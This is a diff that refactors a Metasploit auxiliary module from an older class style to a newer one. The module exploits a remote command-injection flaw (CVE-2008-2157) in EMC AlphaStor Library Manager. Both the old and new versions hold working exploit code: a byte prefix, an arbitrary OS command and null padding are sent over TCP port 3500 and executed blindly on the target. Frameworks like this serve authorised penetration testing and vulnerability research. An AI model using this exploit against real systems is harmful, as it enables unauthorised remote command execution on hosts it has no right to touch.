@@ -1,65 +1,54 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::Tcp
 
-require 'msf/core'
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'EMC AlphaStor Library Manager Arbitrary Command Execution',
+      'Description'    => %q{
+          EMC AlphaStor Library Manager is prone to a remote command-injection vulnerability
+          because the application fails to properly sanitize user-supplied input.
+      },
+      'Author'         => [ 'MC' ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=703' ],
+          [ 'CVE', '2008-2157' ],
+          [ 'OSVDB', '45715' ],
+          [ 'BID', '29398' ],
+        ],
+      'DisclosureDate' => 'May 27 2008'))
 
+      register_options(
+        [
+          Opt::RPORT(3500),
+          OptString.new('CMD', [ false, 'The OS command to execute', 'echo metasploit > metasploit.txt']),
+        ])
+  end
 
-class Metasploit3 < Msf::Auxiliary
+  def run
+    connect
 
-	include Msf::Exploit::Remote::Tcp
+    data = "\x75" + datastore['CMD']
+    pad  = "\x00" * 512
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'           => 'EMC AlphaStor Library Manager Arbitrary Command Execution',
-			'Description'    => %q{
-					EMC AlphaStor Library Manager is prone to a remote command-injection vulnerability
-					because the application fails to properly sanitize user-supplied input.
-			},
-			'Author'         => [ 'MC' ],
-			'License'        => MSF_LICENSE,
-			'Version'        => '$Revision$',
-			'References'     =>
-				[
-					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=703' ],
-					[ 'CVE', '2008-2157' ],
-					[ 'OSVDB', '45715' ],
-					[ 'BID', '29398' ],
-				],
-			'DisclosureDate' => 'May 27 2008'))
+    pkt = data + pad
 
-			register_options(
-				[
-					Opt::RPORT(3500),
-					OptString.new('CMD', [ false, 'The OS command to execute', 'echo metasploit > metasploit.txt']),
-				], self.class)
-	end
+    # commands are executed blindly.
+    print_status("Sending command: #{datastore['CMD']}")
+    sock.put(pkt)
 
-	def run
-		connect
+    select(nil,nil,nil,1)
 
-		data = "\x75" + datastore['CMD']
-		pad  = "\x00" * 512
+    sock.get_once
 
-		pkt = data + pad
+    print_status("Executed '#{datastore['CMD']}'...")
 
-		# commands are executed blindly.
-		print_status("Sending command: #{datastore['CMD']}")
-		sock.put(pkt)
-
-		select(nil,nil,nil,1)
-
-		sock.get_once
-
-		print_status("Executed '#{datastore['CMD']}'...")
-
-		disconnect
-	end
+    disconnect
+  end
 end
